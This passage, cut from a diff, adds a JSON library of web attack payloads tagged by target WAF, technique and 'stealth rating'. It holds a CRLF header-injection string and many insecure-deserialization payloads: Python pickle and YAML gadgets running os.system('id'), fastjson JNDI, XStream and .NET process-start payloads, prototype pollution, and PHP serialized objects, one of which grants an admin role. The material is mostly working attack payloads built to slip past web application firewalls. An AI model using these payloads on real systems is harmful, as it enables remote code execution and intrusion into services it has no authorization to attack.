+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "%0d%0aAccess-Control-Allow-Origin:*%0d%0a",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "cors_via_crlf",
+        "stealth_rating": "medium"
+      }
+    ],
+    "InsecureDeserialization": [
+      {
+        "raw": "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "java_base64",
+        "stealth_rating": "high"
+      },
+      {
+        "raw": "O:8:\"stdClass\":0:{}",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "php_serialize",
+        "stealth_rating": "low"
+      },
+      {
+        "raw": "a:1:{s:4:\"test\";s:4:\"val1\";}",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "php_array_serialize",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "O:+8:\"stdClass\":0:{}",
+        "waf_targets": [
+          "generic",
+          "modsecurity"
+        ],
+        "technique": "php_plus_bypass",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "O:8:\"stdClass\":0:{}",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "php_basic_object",
+        "stealth_rating": "low"
+      },
+      {
+        "raw": "C:11:\"ArrayObject\":37:{x:i:0;a:1:{s:4:\"test\";s:3:\"val\";}}",
+        "waf_targets": [
+          "generic",
+          "modsecurity"
+        ],
+        "technique": "php_custom_serialize",
+        "stealth_rating": "high"
+      },
+      {
+        "raw": "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://localhost/a\"}",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "fastjson_gadget",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "!!python/object/apply:os.system ['id']",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "yaml_python_rce",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "!!python/object/new:os.system ['id']",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "yaml_python_new",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "!!python/object:__main__.Exploit {}",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "yaml_custom_class",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "{\"__proto__\":{\"polluted\":true}}",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "prototype_pollution",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "{\"constructor\":{\"prototype\":{\"polluted\":true}}}",
+        "waf_targets": [
+          "generic",
+          "cloudflare"
+        ],
+        "technique": "constructor_pollution",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "cos\\nsystem\\n(S'id'\\ntR.",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "python_pickle",
+        "stealth_rating": "high"
+      },
+      {
+        "raw": "\\x80\\x04\\x95\\x1e\\x00\\x00\\x00\\x8c\\x05posix\\x8c\\x06system\\x93\\x8c\\x02id\\x85R.",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "pickle_v4",
+        "stealth_rating": "high"
+      },
+      {
+        "raw": "Marshal.dump(`id`)",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "ruby_marshal",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "{'vulnerable': __import__('os').popen('id').read()}",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "python_eval",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "[System.Diagnostics.Process]::Start('cmd','/c id')",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "dotnet_process",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "<java.lang.ProcessBuilder><command><string>id</string></command></java.lang.ProcessBuilder>",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "xstream_rce",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "{\"$type\":\"System.Diagnostics.Process, System\"}",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "dotnet_json_type",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "Tzo0OiJVc2VyIjoxOntzOjQ6InJvbGUiO3M6NToiYWRtaW4iO30=",
+        "waf_targets": [
+          "generic",
+          "modsecurity"
+        ],
+        "technique": "base64_php_object",
+        "stealth_rating": "high"
+      }
+    ]
+  }
+}
